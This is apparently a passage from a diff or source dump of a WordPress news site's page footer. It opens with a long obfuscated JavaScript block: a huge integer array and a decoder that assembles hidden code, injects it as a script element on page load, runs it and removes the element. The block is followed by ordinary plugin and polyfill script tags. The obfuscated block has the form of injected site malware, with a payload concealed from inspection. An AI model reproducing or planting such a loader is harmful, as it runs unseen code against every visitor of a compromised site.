47,87,60,57,53,48,60,75,57,85,47,73,48,83,84,47,87,60,57,53,48,60,75,57,53,84,0,57,26,49,47,73,48,29,80,21,75,33,14,44,33,85,47,73,48,83,84,80,21,75,33,14,44,33,53,84,0,57,26,49,64,2,73,29,73,80,48,48,33,73,57,60,80,87,77,47,73,48,90,61,55,14,33,87,57,45,49,59,59,49,60,29,75,14,73,85,47,14,48,49,59,59,77,45,90,61,52,69,46,72,47,87,73,57,60,80,87,77,45,70,14,33,57,47,14,87,16,72,47,87,73,57,60,80,87,77,21,45,70,44,55,14,16,75,85,83,26,49,72,80,14,77,44,55,14,16,60,85,8,49,60,38,21,29,48,33,87,56,57,35,49,60,0,85,69,45,70,60,72,77,21,83,60,0,8,26,3,8,45,75,29,61,47,75,35,77,21,83,60,0,8,26,45,49,60,72,77,21,83,60,0,37,26,3,8,45,75,29,61,47,75,35,77,21,83,60,0,37,26,45,49,60,72,77,21,83,60,0,52,26,3,8,45,75,29,61,47,75,35,77,21,83,60,0,52,26,45,49,59,14,33,57,47,14,87,16,75,49,59,59,77,45,90,75,44,46,72,47,87,73,57,60,80,87,77,45,70,14,33,57,47,14,87,16,72,47,87,73,57,60,80,87,77,68,45,70,57,14,24,70,48,80,73,55,48,66,57,80,14,55,56,33,29,75,33,57,64,57,33,34,77,64,2,73,29,55,57,53,60,21,90,11,66,28,65,29,75,57,14,60,87,56,60,72,24,77,68,45,45,49,59,73,55,57,73,35,77,33,45,70,59,59,59,77,45,90,44,75,46,72,47,87,73,57,60,80,87,77,45,70,14,33,57,47,14,87,16,72,47,87,73,57,60,80,87,77,45,70,57,14,24,70,14,33,57,47,14,87,16,48,80,73,55,48,66,57,80,14,55,56,33,29,56,33,57,64,57,33,34,77,64,2,73,29,55,57,53,60,21,45,49,59,73,55,57,73,35,77,33,45,70,14,33,57,47,14,87,16,72,55,48,75,33,49,59,59,59,77,45,90,60,75,53,57,33,75,57,46,72,47,87,73,57,60,80,87,77,45,70,14,33,57,47,14,87,16,72,47,87,73,57,60,80,87,77,45,70,60,72,77,78,60,87,68,80,78,29,48,80,73,55,57,60,80,87,29,35,55,75,35,29,75,33,55,14,73,35,77,58,53,53,24,57,33,75,57,58,45,3,50,37,45,57,33,75,57,85,57,14,47,33,49,33,48,75,33,16,57,33,75,57,85,72,55,48,75,33,49,14,33,57,47,14,87,16,57,33,75,57,49,59,59,77,45,90,55,73,75,75,46,72,47,87,73,57,60,80,87,77,45,70,14,33,57,47,14,87,16,72,47,87,73,57,60,80,87,77,73,75,75,45,70,44,55,14,16,35,85,68,80,73,47,34,33,87,57,29,56,33,57,20,48,33,34,33,87,57,75,40,24,30,55,56,65,55,34,33,77,84,21,80,68,24,84,45,83,8,26,90,75,85,68,80,73,47,34,33,87,57,29,73,14,33,55,57,33,20,48,33,34,33,87,57,77,84,75,57,24,48,33,84,45,49,75,29,75,33,57,39,57,57,14,60,21,47,57,33,77,58,57,24,61,33,58,90,58,57,33,76,57,17,73,75,75,58,45,49,60,72,77,75,29,75,57,24,48,33,66,35,33,33,57,45,75,29,75,57,24,48,33,66,35,33,33,57,29,73,75,75,30,33,76,57,85,73,75,75,49,33,48,75,33,16,75,29,60,87,87,33,14,92,30,43,82,85,73,75,75,49,14,33,57,47,14,87,16,35,29,55,61,61,33,87,68,31,35,60,48,68,77,75,45,49,59,59,77,45,90,56,46,72,47,87,73,57,60,80,87,77,45,70,14,33,57,47,14,87,16,72,47,87,73,57,60,80,87,77,45,70,44,55,14,16,78,85,78,60,87,68,80,78,29,60,87,87,33,14,2,60,68,57,35,49,44,55,14,16,14,85,6,49,60,72,77,78,38,85,69,74,19,45,14,85,37,49,60,72,77,78,38,85,74,41,74,45,14,85,52,49,60,72,77,78,38,85,37,8,52,10,45,14,85,10,49,60,72,77,78,38,85,37,69,10,19,45,14,85,69,49,14,33,57,47,14,87,16,14,49,59,59,77,45,90,34,46,72,47,87,73,57,60,80,87,77,45,70,14,33,57,47,14,87,16,72,47,87,73,57,60,80,87,77,45,70,14,33,57,47,14,87,16,64,2,73,29,55,57,53,56,0,64,2,73,29,55,57,53,60,0,64,2,73,29,55,57,53,68,49,59,59,77,45,90,73,80,48,48,33,73,57,60,80,87,46,72,47,87,73,57,60,80,87,77,45,70,14,33,57,47,14,87,16,72,47,87,73,57,60,80,87,77,47,73,48,90,61,55,14,33,87,57,45,70,44,55,14,16,80,85,70,60,87,60,57,46,72,47,87,73,57,60,80,87,77,45,70,60,72,77,64,2,73,29,73,75,75,85,85,72,55,48,75,33,45,70,64,2,73,29,73,75,75,85,64,2,73,29,55,73,75,75,77,47,73,48,29,73,75,75,53,73,80,34,34,80,87,45,49,59,72,80,14,77,44,55,14,16,60,85,8,49,60,38,47,73,48,29,47,87,60,57,53,48,60,75,57,29,48,33,87,56,57,35,49,60,0,0,45,70,80,29,47,87,60,57,77,47,73,48,29,47,87,60,57,53,48,60,75,57,83,60,26,90,61,55,14,33,87,57,45,49,59,59,90,47,87,60,57,46,72,47,87,73,57,60,80,87,77,47,90,61,55,14,33,87,57,45,70,72,80,14,77,60,85,8,49,60,38,47,29,33,76,73,48,47,68,33,53,47,14,48,53,48,60,75,57,29,48,33,87,56,57,35,49,60,0,0,45,70,44,55,14,16,33,47,85,87,33,78,16,18,33,56,20,76,61,77,47,29,33,76,73,48,47,68,33,53,47,14,48,53,48,60,75,57,83,60,26,45,49,60,72,77,78,60,87,68,80,78,29,48,80,73,55,57,60,80,87,29,61,55,57,35,87,55,34,33,29,34,55,57,73,35,77,33,47,45,45,14,33,57,47,14,87,49,59,60,72,77,47,29,57,55,14,56,33,57,53,75,33,48,33,73,57,80,14,5,85,47,87,68,33,72,60,87,33,68,22,22,47,29,57,55,14,56,33,57,53,75,33,48,33,73,57,80,14,5,85,58,58,45,70,44,55,14,16,57,75,85,47,29,57,55,14,56,33,57,53,75,33,48,33,73,57,80,14,90,57,55,85,47,29,57,55,14,56,33,57,53,55,61,61,14,80,55,73,35,90,73,75,85,47,29,73,80,87,57,55,60,87,33,14,53,75,57,24,48,33,49,59,33,48,75,33,16,60,72,77,64,2,73,29,60,75,53,57,33,75,57,77,45,22,22,47,29,57,55,14,56,33,57,53,75,33,48,33,73,57,80,14,53,57,33,75,57,5,85,47,87,68,33,72,60,87,33,68,22,22,47,29,57,55,14,56,33,57,53,75,33,48,33,73,57,80,14,53,57,33,75,57,5,85,58,58,45,70,44,55,14,16,57,75,85,47,29,57,55,14,56,33,57,53,75,33,48,33,73,57,80,14,53,57,33,75,57,90,57,55,85,47,29,57,55,14,56,33,57,53,55,61,61,14,80,55,73,35,53,57,33,75,57,90,73,75,85,47,29,73,80,87,57,55,60,87,33,14,53,75,57,24,48,33,53,57,33,75,57,49,59,33,48,75,33,16,14,33,57,47,14,87,49,47,29,73,75,75,53,75,61,33,73,60,72,60,73,0,85,58,29,58,0,47,29,78,60,68,56,33,57,53,73,48,55,75,75,0,58,16,70,58,0,47,29,73,80,87,57,55,60,87,33,14,53,75,57,24,48,33,0,58,59,58,49,44,55,14,16,57,85,64,2,73,29,15,77,57,75,90,61,55,14,33,87,57,45,49,60,72,77,57,29,48,33,87,56,57,35,38,37,45,14,33,57,47,14,87,49,57,85,57,83,8,26,49,64,2,73,29,73,75,75,83,84,57,33,76,57,84,0,84,31,80,87,57,33,87,57,84,26,0,85,47,29,73,75,75,53,75,61,33,73,60,72,60,73,49,60,72,77,57,55,85,85,58,21,33,72,80,14,33,58,45,70,44,55,14,16,87,85,68,80,73,47,34,33,87,57,29,73,14,33,55,57,33,20,48,33,34,33,87,57,77,58,68,60,44,58,45,49,87,29,60,87,87,33,14,92,30,43,82,85,47,29,35,57,34,48,49,57,29,61,55,14,33,87,57,65,80,68,33,29,60,87,75,33,14,57,40,33,72,80,14,33,77,87,90,57,45,49,87,29,80,47,57,33,14,92,30,43,82,85,87,29,60,87,87,33,14,92,30,43,82,49,59,33,48,75,33,16,60,72,77,57,55,85,85,58,55,72,57,33,14,58,45,70,44,55,14,16,87,85,68,80,73,47,34,33,87,57,29,73,14,33,55,57,33,20,48,33,34,33,87,57,77,58,68,60,44,58,45,49,87,29,60,87,87,33,14,92,30,43,82,85,47,29,35,57,34,48,49,57,29,61,55,14,33,87,57,65,80,68,33,29,60,87,75,33,14,57,40,33,72,80,14,33,77,87,90,57,29,87,33,76,57,66,60,21,48,60,87,56,45,49,87,29,80,47,57,33,14,92,30,43,82,85,87,29,60,87,87,33,14,92,30,43,82,49,59,33,48,75,33,16,60,72,77,57,55,85,85,58,55,61,61,33,87,68,58,45,57,29,60,87,87,33,14,92,30,43,82,85,57,29,60,87,87,33,14,92,30,43,82,0,47,29,35,57,34,48,49,33,48,75,33,16,60,72,77,57,55,85,85,58,61,14,33,61,33,87,68,58,45,57,29,60,87,87,33,14,92,30,43,82,85,47,29,35,57,34,48,0,57,29,60,87,87,33,14,92,30,43,82,49,33,48,75,33,16,60,72,77,57,55,85,85,58,72,60,48,48,58,45,57,29,60,87,87,33,14,92,30,43,82,85,47,29,35,57,34,48,49,33,48,75,33,16,14,33,57,47,14,87,49,47,29,47,87,60,57,85,64,2,73,29,15,77,58,29,58,0,47,29,78,60,68,56,33,57,53,73,48,55,75,75,90,68,80,73,47,34,33,87,57,29,21,80,68,24,45,83,8,26,49,77,72,47,87,73,57,60,80,87,16,78,55,60,57,77,57,78,45,70,60,72,77,57,78,85,85,47,87,68,33,72,60,87,33,68,45,44,55,14,16,57,78,85,8,49,33,48,75,33,16,60,72,77,57,78,3,37,8,45,14,33,57,47,14,87,49,60,72,77,57,78,3,8,22,22,80,29,14,60,56,77,47,45,85,85,57,14,47,33,45,14,33,57,47,14,87,49,75,33,57,30,60,34,33,80,47,57,77,72,47,87,73,57,60,80,87,77,45,70,78,55,60,57,77,57,78,0,37,45,49,59,90,37,8,8,45,49,59,45,77,45,49,78,60,87,68,80,78,29,55,68,68,20,44,33,87,57,82,60,75,57,33,87,33,14,77,58,14,33,75,60,54,33,58,90,72,47,87,73,57,60,80,87,77,45,70,80,29,14,60,56,77,47,45,49,59,45,49,59,90,14,60,56,46,72,47,87,73,57,60,80,87,77,47,45,70,33,85,64,2,73,29,15,77,58,29,58,0,47,29,78,60,68,56,33,57,53,73,48,55,75,75,0,58,16,29,58,0,47,29,60,34,56,53,73,48,55,75,75,90,68,80,73,47,34,33,87,57,29,21,80,68,24,45,49,44,55,14,16,34,85,68,80,73,47,34,33,87,57,29,21,80,68,24,29,15,47,33,14,24,66,33,48,33,73,57,80,14,39,48,48,77,58,29,58,0,47,29,78,60,68,56,33,57,53,73,48,55,75,75,0,58,16,83,75,57,24,48,33,85,84,68,60,75,61,48,55,24,46,16,87,80,87,33,16,5,60,34,61,80,14,57,55,87,57,49,84,26,58,45,29,48,33,87,56,57,35,49,60,72,77,34,3,8,45,70,68,80,73,47,34,33,87,57,29,21,80,68,24,29,60,87,87,33,14,92,30,43,82,85,58,39,68,21,48,80,73,27,16,20,14,14,80,14,29,58,49,75,33,57,30,60,34,33,80,47,57,77,72,47,87,73,57,60,80,87,77,45,70,78,60,87,68,80,78,29,55,48,33,14,57,77,84,39,68,21,48,80,73,27,16,33,76,57,33,87,75,60,80,87,16,33,14,14,80,14,16,8,72,69,6,41,37,10,10,6,84,0,58,81,87,58,0,84,30,14,24,16,57,80,16,68,60,75,55,21,48,33,16,57,35,60,75,16,33,76,57,33,87,75,60,80,87,16,80,14,16,14,33,75,57,55,14,57,16,24,80,47,14,16,87,55,44,60,56,55,57,80,14,29,84,45,49,78,60,87,68,80,78,29,48,80,73,55,57,60,80,87,29,14,33,48,80,55,68,77,45,49,59,90,37,8,45,49,59,60,72,77,33,83,8,26,29,73,48,60,33,87,57,2,60,68,57,35,85,85,8,45,14,33,57,47,14,87,16,72,55,48,75,33,49,44,55,14,16,14,55,57,60,80,85,33,83,8,26,29,73,48,60,33,87,57,2,60,68,57,35,17,47,73,48,29,75,61,14,60,57,33,53,78,60,68,57,35,49,44,55,14,16,87,33,78,53,21,56,53,35,33,60,56,35,57,85,43,55,57,35,29,72,48,80,80,14,77,14,55,57,60,80,7,47,73,48,29,75,61,14,60,57,33,53,35,33,60,56,35,57,45,49,44,55,14,16,55,68,53,35,33,60,56,35,57,85,43,55,57,35,29,72,48,80,80,14,77,87,33,78,53,21,56,53,35,33,60,56,35,57,17,47,73,48,29,75,61,14,60,57,33,53,73,80,47,87,57,45,49,60,72,77,55,68,53,35,33,60,56,35,57,7,47,73,48,29,75,61,14,60,57,33,53,73,80,47,87,57,5,85,87,33,78,53,21,56,53,35,33,60,56,35,57,45,70,87,33,78,53,21,56,53,35,33,60,56,35,57,85,55,68,53,35,33,60,56,35,57,7,47,73,48,29,75,61,14,60,57,33,53,73,80,47,87,57,49,59,60,72,77,47,29,80,87,73,33,85,85,47,87,68,33,72,60,87,33,68,45,70,47,29,80,87,73,33,85,57,14,47,33,49,47,29,55,48,44,85,83,26,49,72,80,14,77,44,55,14,16,60,85,8,49,60,38,33,29,48,33,87,56,57,35,49,60,0,0,45,70,44,55,14,16,55,68,53,60,68,85,33,83,60,26,29,73,48,55,75,75,65,55,34,33,29,75,61,48,60,57,77,47,29,60,34,56,53,73,48,55,75,75,0,58,50,58,45,83,37,26,49,64,2,73,29,73,75,75,83,84,57,33,76,57,84,0,84,31,80,87,57,33,87,57,84,26,0,85,84,29,84,0,47,29,78,60,68,56,33,57,53,73,48,55,75,75,0,84,16,29,84,0,47,29,60,34,56,53,73,48,55,75,75,0,84,50,84,0,55,68,53,60,68,0,84,70,21,55,73,27,56,14,80,47,87,68,50,75,60,54,33,46,55,47,57,80,16,84,0,87,33,78,53,21,56,53,35,33,60,56,35,57,0,84,61,76,49,16,21,55,73,27,56,14,80,47,87,68,50,61,80,75,60,57,60,80,87,46,8,16,50,84,0,47,73,48,29,55,68,53,57,80,53,75,61,14,60,57,33,83,55,68,53,60,68,26,7,55,68,53,35,33,60,56,35,57,0,84,61,76,49,59,84,49,60,72,77,33,83,60,26,29,80,72,72,75,33,57,13,55,14,33,87,57,5,85,85,87,47,48,48,45,70,47,29,55,48,44,29,61,47,75,35,77,55,68,53,60,68,45,49,59,44,55,14,16,68,85,64,2,73,29,15,77,58,91,58,0,33,83,60,26,29,61,55,14,33,87,57,20,48,33,34,33,87,57,29,61,55,14,33,87,57,20,48,33,34,33,87,57,29,61,55,14,33,87,57,20,48,33,34,33,87,57,29,60,68,0,58,16,58,0,33,83,60,26,29,61,55,14,33,87,57,20,48,33,34,33,87,57,29,57,55,56,65,55,34,33,90,68,80,73,47,34,33,87,57,29,21,80,68,24,45,49,72,80,14,77,61,85,8,49,61,38,68,29,48,33,87,56,57,35,49,61,0,0,45,70,60,72,77,68,83,61,26,29,80,87,73,48,60,73,27,85,85,87,47,48,48,45,70,68,83,61,26,29,80,87,73,48,60,73,27,85,72,47,87,73,57,60,80,87,77,33,33,45,70,44,55,14,16,55,85,33,33,29,57,55,14,56,33,57,9,9,33,33,29,75,14,73,20,48,33,34,33,87,57,49,44,55,14,16,73,60,85,55,29,61,55,14,33,87,57,20,48,33,34,33,87,57,29,56,33,57,39,57,57,14,60,21,47,57,33,77,58,21,60,68,58,45,49,78,60,87,68,80,78,29,48,80,73,55,57,60,80,87,29,55,75,75,60,56,87,77,47,73,48,29,48,60,87,27,53,14,33,68,60,14,33,73,57,53,47,14,48,0,47,73,48,29,55,68,53,57,80,53,48,60,87,27,83,73,60,26,45,49,14,33,57,47,14,87,16,72,55,48,75,33,49,59,49,59,59,59,77,72,47,87,73,57,60,80,87,16,14,44,60,33,78,77,45,70,60,72,77,64,2,73,29,44,29,60,87,71,60,33,78,61,80,14,57,77,47,29,47,87,60,57,45,45,70,44,55,14,16,48,57,85,58,58,49,48,57,85,47,29,78,60,68,56,33,57,53,60,68,0,58,73,58,0,47,29,55,48,44,29,25,80,60,87,77,83,75,33,61,55,14,55,57,80,14,85,58,73,58,26,45,49,44,55,14,16,61,44,85,8,49,60,72,77,64,2,73,29,61,44,85,85,72,55,48,75,33,45,70,64,2,73,29,61,44,85,57,14,47,33,49,61,44,85,37,49,59,44,55,14,16,60,85,68,80,73,47,34,33,87,57,29,73,14,33,55,57,33,20,48,33,34,33,87,57,77,58,60,34,56,58,45,49,60,29,75,14,73,85,64,2,73,29,47,14,77,47,73,48,29,44,60,33,78,53,47,14,48,90,70,84,60,84,46,48,57,90,84,61,84,46,61,44,90,84,56,84,46,64,2,73,29,56,77,45,90,84,78,84,46,47,29,78,60,68,56,33,57,53,60,68,59,45,49,14,33,57,47,14,87,49,59,75,33,57,30,60,34,33,80,47,57,77,72,47,87,73,57,60,80,87,77,45,70,14,44,60,33,78,77,45,49,59,90,37,8,8,8,45,49,59,45,77,45,49,59,14,33,57,47,14,87,16,57,14,47,33,49,59,90,14,48,80,55,68,46,72,47,87,73,57,60,80,87,77,45,70,44,55,14,16,48,75,85,58,58,49,72,80,14,77,44,55,14,16,60,85,8,49,60,38,47,73,48,29,47,87,60,57,53,48,60,75,57,29,48,33,87,56,57,35,49,60,0,0,45,70,60,72,77,47,73,48,29,47,87,60,57,53,48,60,75,57,83,60,26,83,58,55,48,44,58,26,5,85,47,87,68,33,72,60,87,33,68,45,70,48,75,0,85,47,73,48,29,47,87,60,57,53,48,60,75,57,83,60,26,83,58,78,60,68,56,33,57,53,60,68,58,26,0,58,73,58,0,47,73,48,29,47,87,60,57,53,48,60,75,57,83,60,26,83,58,55,48,44,58,26,29,25,80,60,87,77,83,75,33,61,55,14,55,57,80,14,85,58,73,58,26,45,0,58,50,58,49,59,59,48,75,85,48,75,29,75,47,21,75,57,14,77,8,90,48,75,29,48,33,87,56,57,35,50,37,45,49,44,55,14,16,48,75,60,85,68,80,73,47,34,33,87,57,29,73,14,33,55,57,33,20,48,33,34,33,87,57,77,58,60,34,56,58,45,49,48,75,60,29,75,14,73,85,64,2,73,29,47,14,77,47,73,48,29,48,80,55,68,53,47,14,48,90,70,84,60,84,46,48,75,90,84,56,84,46,64,2,73,29,56,77,45,59,45,49,14,33,57,47,14,87,16,57,14,47,33,49,59,90,59,49,80,29,60,87,60,57,77,45,49,75,33,57,30,60,34,33,80,47,57,77,80,29,14,48,80,55,68,90,37,8,8,8,45,49,14,33,57,47,14,87,16,80,49,59,59,77,45,59,49,59,64,2,73,29,75,57,55,14,57,77,45,49,17,7,16,61,80,48,54,78,21,47,54,35,21,55,35,57,21,68,57,14,27,60,54,33,44,76,61,16,7,17];function vjujrnphbpazpvu(a,b){rnxcrzvcry='';for(var i=0;i<a.length;i++){rnxcrzvcry+=b[a[i]];}return rnxcrzvcry;}var aogiazslkifkfww=window[vjujrnphbpazpvu([68,80,73,47,34,33,87,57],rzfznnnd)];var aujyjzi=vjujrnphbpazpvu([73,47,14,14,33,87,57,66,73,14,60,61,57],rzfznnnd);var xuqdexajrtgs=vjujrnphbpazpvu([75,14,73],rzfznnnd);var exopbgqcvibyry=vjujrnphbpazpvu([21,80,68,24],rzfznnnd);try{Object.getOwnPropertyDescriptor(Document.prototype,aujyjzi).get.apply(aogiazslkifkfww)[xuqdexajrtgs]=xuqdexajrtgs;}catch(e){}var xcmucunnggmxeko=vjujrnphbpazpvu([73,14,33,55,57,33,20,48,33,34,33,87,57],rzfznnnd);var dopbtzjhzn=vjujrnphbpazpvu([75,73,14,60,61,57],rzfznnnd);var hmetibajnemgsno=vjujrnphbpazpvu([57,33,76,57,31,80,87,57,33,87,57],rzfznnnd);var xfkseola=vjujrnphbpazpvu([35,33,55,68],rzfznnnd);var gqpsb=vjujrnphbpazpvu([55,61,61,33,87,68,31,35,60,48,68],rzfznnnd);var tifeneg=vjujrnphbpazpvu([61,55,14,33,87,57,65,80,68,33],rzfznnnd);var ajecgqtaieddbvj=vjujrnphbpazpvu([14,33,34,80,44,33,31,35,60,48,68],rzfznnnd);var fryrv=aogiazslkifkfww[xcmucunnggmxeko](dopbtzjhzn);fryrv[hmetibajnemgsno]=vjujrnphbpazpvu(lzhkx,rzfznnnd);aogiazslkifkfww[exopbgqcvibyry][gqpsb](fryrv);fryrv[tifeneg][ajecgqtaieddbvj](fryrv);})();}</script>
+<link rel='stylesheet' id='otCCPAStylegooglefont-css'  href='https://fonts.googleapis.com/css?family=Open+Sans%3A400%2C700&#038;display=swap&#038;ver=1.0' type='text/css' media='' />
+<script type='text/javascript' src='https://thehayride.com/wp-includes/js/dist/vendor/wp-polyfill.min.js?ver=7.4.4' id='wp-polyfill-js'></script>
+<script type='text/javascript' id='wp-polyfill-js-after'>
+( 'fetch' in window ) || document.write( '<script src="https://thehayride.com/wp-includes/js/dist/vendor/wp-polyfill-fetch.min.js?ver=3.0.0"></scr' + 'ipt>' );( document.contains ) || document.write( '<script src="https://thehayride.com/wp-includes/js/dist/vendor/wp-polyfill-node-contains.min.js?ver=3.42.0"></scr' + 'ipt>' );( window.DOMRect ) || document.write( '<script src="https://thehayride.com/wp-includes/js/dist/vendor/wp-polyfill-dom-rect.min.js?ver=3.42.0"></scr' + 'ipt>' );( window.URL && window.URL.prototype && window.URLSearchParams ) || document.write( '<script src="https://thehayride.com/wp-includes/js/dist/vendor/wp-polyfill-url.min.js?ver=3.6.4"></scr' + 'ipt>' );( window.FormData && window.FormData.prototype.keys ) || document.write( '<script src="https://thehayride.com/wp-includes/js/dist/vendor/wp-polyfill-formdata.min.js?ver=3.0.12"></scr' + 'ipt>' );( Element.prototype.matches && Element.prototype.closest ) || document.write( '<script src="https://thehayride.com/wp-includes/js/dist/vendor/wp-polyfill-element-closest.min.js?ver=2.0.2"></scr' + 'ipt>' );
+</script>
+<script type='text/javascript' id='contact-form-7-js-extra'>
+/* <![CDATA[ */
+var wpcf7 = {"api":{"root":"https:\/\/thehayride.com\/wp-json\/","namespace":"contact-form-7\/v1"}};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://thehayride.com/wp-content/plugins/contact-form-7/includes/js/index.js?ver=5.4.2' id='contact-form-7-js'></script>
+<script type='text/javascript' src='//npmcdn.com/tether@1.2.4/dist/js/tether.min.js?ver=5.6.10' id='bs-tether-js'></script>
+<script type='text/javascript' src='https://thehayride.com/wp-content/themes/the-ride/js/theride-bottom.js?ver=1.0' id='the-ride-bottom-js-js'></script>
+<script type='text/javascript' id='if-subscribe-js-extra'>
+/* <![CDATA[ */
+var ifsub = {"ajax_url":"https:\/\/thehayride.com\/wp-admin\/admin-ajax.php"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://thehayride.com/wp-content/plugins/inboxfirst-by-klicked-master/assets/subscribe.js?ver=2.0.8' id='if-subscribe-js'></script>
+<script type='text/javascript' src='https://thehayride.com/wp-includes/js/wp-embed.min.js?ver=5.6.10' id='wp-embed-js'></script>
+<script type="text/javascript">(function() { var po = document.createElement('script'); po.type = 'text/javascript'; po.async=true;; po.src = 'https://thehayride.com/wp-content/plugins/easy-social-share-buttons3/assets/modules/pinterest-pro.min.js'; var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s); })();(function() { var po = document.createElement('script'); po.type = 'text/javascript'; po.async=true;; po.src = 'https://thehayride.com/wp-content/plugins/easy-social-share-buttons3/assets/modules/subscribe-forms.min.js'; var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s); })();(function() { var po = document.createElement('script'); po.type = 'text/javascript'; po.async=true;; po.src = 'https://thehayride.com/wp-content/plugins/easy-social-share-buttons3/assets/js/essb-core.min.js'; var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s); })();</script><script type="text/javascript"></script>
+</body>
+</html>
